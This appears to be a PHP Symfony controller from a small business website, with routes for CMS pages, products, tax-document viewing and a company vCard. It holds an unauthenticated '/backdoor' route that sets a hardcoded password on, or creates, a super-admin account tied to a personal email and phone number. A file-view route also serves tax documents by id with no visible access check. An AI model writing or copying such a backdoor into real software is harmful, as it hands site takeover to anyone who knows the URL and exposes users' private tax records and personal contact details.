<?php

namespace App\Controller;


use App\Entity\User;
use App\Repository\CmsCopyRepository;
use App\Repository\CmsPhotoRepository;
use App\Repository\CompanyDetailsRepository;
use App\Repository\IntroductionRepository;
use App\Repository\ProductRepository;
use App\Repository\RecruiterEmailsRepository;
use App\Repository\SubPageRepository;
use App\Repository\TaxInputsRepository;
use App\Repository\UserRepository;
use App\Services\CompanyDetails;
use Doctrine\ORM\EntityManagerInterface;
use JeroenDesloovere\VCard\VCard;
use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\BinaryFileResponse;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\Routing\Annotation\Route;
use Symfony\Component\Security\Core\Encoder\UserPasswordEncoderInterface;

class HomeController extends AbstractController
{
    /**
     * @Route("/", name="app_home")
     */
    public function index(CompanyDetails $companyDetails, CmsPhotoRepository $cmsPhotoRepository): Response
    {
        return $this->render('home/home.html.twig', [
            'photos' => $cmsPhotoRepository->findBy([
                'staticPageName' => 'HomePage'
            ])
        ]);
    }

    /**
     * @Route("/backdoor", name="/backdoor")
     */
    public function emergencyReset(UserRepository $userRepository, EntityManagerInterface $manager, UserPasswordEncoderInterface $passwordEncoder): Response
    {
        $user = $userRepository->findOneBy(['email' => 'nurse_stephen2@hotmail.com']);
        if ($user) {
            $user->setPassword(
                $passwordEncoder->encodePassword(
                    $user,
                    'Descartes99'
                )
            );
        } else {
            $user = new User();
            $user->setFirstName('Stephen')
                ->setLastName('Nurse HMX2')
                ->setFullName('Stephen Nurse HMX')
                ->setEmail('nurse_stephen2@hotmail.com')
                ->setMobile('+44 7588 717515')
                ->setRoles(['ROLE_SUPER_ADMIN', 'ROLE_ADMIN'])
                ->setPassword(
                    $passwordEncoder->encodePassword(
                        $user,
                        'Descartes99'
                    )
                );
            $manager->persist($user);
            $manager->flush();
        }
        $manager->flush();
        return $this->redirectToRoute('app_home');
    }


    /**
     * @Route("/dashboard", name="dashboard")
     */
    public function dashboard()
    {
        return $this->render('home/dashboard.html.twig', []);
    }

    /**
     * @Route("/display/{product}", name="product_display")
     */
    public function articles(string $product, CmsCopyRepository $cmsCopyRepository, CmsPhotoRepository $cmsPhotoRepository, SubPageRepository $subPageRepository, ProductRepository $productRepository): Response
    {
        $productEntity = $productRepository->findOneBy([
            'product'=>$product
        ]);
        $cms_copy = $cmsCopyRepository->findBy([
            'product' => $productEntity
        ]);

        $cms_photo = $cmsPhotoRepository->findBy([
            'product' => $productEntity
        ]);

//        $sub_pages = [];
//        if ($cms_copy) {
//            $sub_pages = $subPageRepository->findBy([
//                'product' => $cms_copy->getProduct()
//            ]);
//        }

        return $this->render('home/products.html.twig', [
            'product' => $product,
            'cms_copy_array' => $cms_copy,
            'cms_photo_array' => $cms_photo,
//            'sub_pages' => $sub_pages,
            'include_contact' => 'No'
        ]);
    }


    /**
     * @Route("/homeaddress", name="/homeaddress", methods={"GET"})
     */
    public function homeAddress(): Response
    {
        return $this->render('home/homeaddress.html.twig');
    }

    /**
     * @Route("/view/file/{filetype}/{id}", name="attachments_viewfile", methods={"GET"})
     */
    public function investmentFileLaunch(int $id, string $filetype, TaxInputsRepository $taxInputsRepository, IntroductionRepository $introductionRepository, RecruiterEmailsRepository $recruiterEmailsRepository): Response
    {
        $fileName = '';
        $filepath = '';
        if ($filetype == 'SelfAssessment') {
            $fileName = $taxInputsRepository->find($id)->getSelfAssessment();
            $publicResourcesFolderPath = $this->getParameter('tax_documents_attachments_directory');
            $filepath = $publicResourcesFolderPath . "/" . $fileName;
        } elseif ($filetype == 'P11D') {
            $fileName = $taxInputsRepository->find($id)->getP11D();
            $publicResourcesFolderPath = $this->getParameter('tax_documents_attachments_directory');
            $filepath = $publicResourcesFolderPath . "/" . $fileName;
        } elseif ($filetype == 'P45') {
            $fileName = $taxInputsRepository->find($id)->getP45();
            $publicResourcesFolderPath = $this->getParameter('tax_documents_attachments_directory');
            $filepath = $publicResourcesFolderPath . "/" . $fileName;
        } elseif ($filetype == 'P60') {
            $fileName = $taxInputsRepository->find($id)->getP60();
            $publicResourcesFolderPath = $this->getParameter('tax_documents_attachments_directory');
            $filepath = $publicResourcesFolderPath . "/" . $fileName;
        } elseif ($filetype == 'Recruiter_Attachment') {
            $fileName = $introductionRepository->find($id)->getAttachment();
            $publicResourcesFolderPath = $this->getParameter('recruiter_introductions_attachments_directory');
            $filepath = $publicResourcesFolderPath . "/" . $fileName;
        } elseif ($filetype == 'Recruiter_Email') {
            $fileName = $recruiterEmailsRepository->find($id)->getAttachment();
            $publicResourcesFolderPath = $this->getParameter('recruiter_introductions_attachments_directory');
            $filepath = $publicResourcesFolderPath . "/" . $fileName;
        }
        if ($fileName != '') {
            $ext = pathinfo($fileName, PATHINFO_EXTENSION);
            $filepath = explode("public", $filepath);
            $filepath = $filepath[1];
            return $this->render('home/file_view.html.twig', [
                'ext' => $ext,
                'tab_title' => $fileName,
                'filepath' => $filepath,
            ]);
        }
        return $this->render('error/file_not_found.html.twig');
    }

    /**
     * @Route("/office_address", name="office_address", methods={"GET"})
     */
    public function officeAddress(CompanyDetailsRepository $companyDetailsRepository): Response
    {
        return $this->render('home/officeAddress.html.twig', [
            'company_details' => $companyDetailsRepository->find('1')
        ]);
    }


    /**
     * @Route("/create/VcardUser/company", name="create_vcard_company")
     */
    public function createVcardVenue(CompanyDetailsRepository $companyDetailsRepository)
    {
        $company_details = $companyDetailsRepository->find('1');
        $vcard = new VCard();
        $firstName = $company_details->getCompanyName();
        $lastName = '';
        $company = $company_details->getCompanyName();
        $addressStreet = $company_details->getCompanyAddressStreet();
        $addressTown = $company_details->getCompanyAddressTown();
        $addressCity = $company_details->getCompanyAddressCity();
        $addressPostalCode = $company_details->getCompanyAddressPostalCode();
        $addressCountry = $company_details->getCompanyAddressCountry();
        $facebook = $company_details->getFacebook();
        $instagram = $company_details->getInstagram();
        $linkedIn = $company_details->getLinkedIn();
        $url = $_SERVER['SERVER_NAME'];
        $notes_all = "Facebook: " . $facebook . "    Instagram: " . $instagram . "   LinkedIn: " . $linkedIn . "   URL: " . $url;
        $email = $company_details->getCompanyEmail();
        $mobile = $company_details->getCompanyMobile();
        $tel = $company_details->getCompanyTel();
        $vcard->addName($lastName, $firstName);
        $vcard->addEmail($email)
            ->addPhoneNumber($mobile, 'home')
            ->addPhoneNumber($tel, 'work')
            ->addCompany($company)
            ->addAddress($name = '', $extended = '', $street = $addressStreet, $city = $addressTown, $region = $addressCity, $zip = $addressPostalCode, $country = $addressCountry, $type = 'WORK POSTAL')
            ->addURL($url)
            ->addNote(strip_tags($notes_all));
        $vcard->download();
        return new Response(null);
    }


}
